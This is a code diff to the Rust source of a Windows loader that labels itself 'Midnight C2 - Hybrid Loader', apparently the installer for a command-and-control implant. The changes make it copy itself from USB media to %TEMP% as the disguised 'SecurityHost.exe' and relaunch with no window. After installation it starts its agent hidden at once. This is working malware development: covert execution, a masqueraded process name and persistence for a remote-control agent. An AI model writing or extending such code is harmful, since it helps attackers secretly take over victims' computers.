@@ -402,10 +402,41 @@ fn main() -> windows::core::Result<()> {
         let args: Vec<String> = std::env::args().collect();
         let (current_path, target_path, _) = get_install_info();
         
-        // --- IMPROVED AGENT MODE DETECTION (v0.6.10 Memory Restore) ---
-        let is_target_path = current_path.to_lowercase() == target_path.to_lowercase();
+        // === USB QUICK-RELEASE ===
+        // If running from external media (not %TEMP% and not install path),
+        // copy self to %TEMP% and re-launch from there so USB can be removed immediately
+        let current_lower = current_path.to_lowercase();
+        let target_lower = target_path.to_lowercase();
+        let temp_dir = std::env::temp_dir();
+        let temp_lower = temp_dir.to_str().unwrap_or("").to_lowercase();
+        
+        let is_from_temp = current_lower.starts_with(&temp_lower);
+        let is_from_install = current_lower == target_lower;
+        // Check if "relocated" flag is present (to prevent infinite re-launch loop)
+        let has_relocated_flag = args.iter().any(|a| a == "--relocated");
+        
+        if !is_from_temp && !is_from_install && !has_relocated_flag {
+            // Copy self to %TEMP%\SecurityHost.exe
+            let temp_exe = temp_dir.join(EXE_NAME);
+            if let Ok(_) = std::fs::copy(&current_path, &temp_exe) {
+                // Re-launch from %TEMP% with all original args + --relocated flag
+                let mut cmd = std::process::Command::new(&temp_exe);
+                for arg in args.iter().skip(1) {
+                    cmd.arg(arg);
+                }
+                cmd.arg("--relocated");
+                cmd.creation_flags(0x08000000); // CREATE_NO_WINDOW for the launcher
+                let _ = cmd.spawn();
+                // Exit immediately - USB can now be removed
+                std::process::exit(0);
+            }
+            // If copy fails, continue running from USB (fallback)
+        }
+        
+        // === AGENT MODE DETECTION ===
+        let is_target_path = current_lower == target_lower;
         let is_system = std::env::var("USERNAME").unwrap_or_default().to_uppercase() == "SYSTEM";
-        let is_agent_mode = (args.len() > 1 && args[1] == "agent") || is_target_path || is_system;
+        let is_agent_mode = (args.iter().any(|a| a == "agent")) || is_target_path || is_system;
         
         if !is_agent_mode {
             // ===== INSTALLER MODE (with UI) =====
@@ -414,7 +445,7 @@ fn main() -> windows::core::Result<()> {
             
             std::thread::spawn(move || {
                 append_log("╔════════════════════════════════════════╗");
-                append_log("║   Midnight C2 - Hybrid Loader v0.6.11 ║");
+                append_log("║   Midnight C2 - Hybrid Loader v0.6.13 ║");
                 append_log("║       Build Date: 2026-02-15          ║");
                 append_log("╚════════════════════════════════════════╝");
                 append_log("");
@@ -442,13 +473,20 @@ fn main() -> windows::core::Result<()> {
                         append_log("");
                         append_log("════════════════════════════════════════");
                         append_log("  ✅ Installation Complete!");
-                        append_log("  Agent will start via Scheduled Task");
+                        append_log("  🚀 Starting agent now...");
                         append_log("════════════════════════════════════════");
-                        append_log("");
-                        append_log("[*] Closing window in 3 seconds...");
                         
-                        // Wait 3 seconds before closing
-                        std::thread::sleep(std::time::Duration::from_secs(3));
+                        // Launch agent immediately (don't wait for Scheduled Task)
+                        let (_, target_path, _) = get_install_info();
+                        let _ = std::process::Command::new(&target_path)
+                            .arg("agent")
+                            .creation_flags(0x08000000) // CREATE_NO_WINDOW
+                            .spawn();
+                        
+                        append_log("");
+                        append_log("[*] Agent started! Closing window in 2 seconds...");
+                        
+                        std::thread::sleep(std::time::Duration::from_secs(2));
                         PostMessageW(hwnd, WM_CLOSE, WPARAM(0), LPARAM(0)).ok();
                     }
                     Err(e) => {
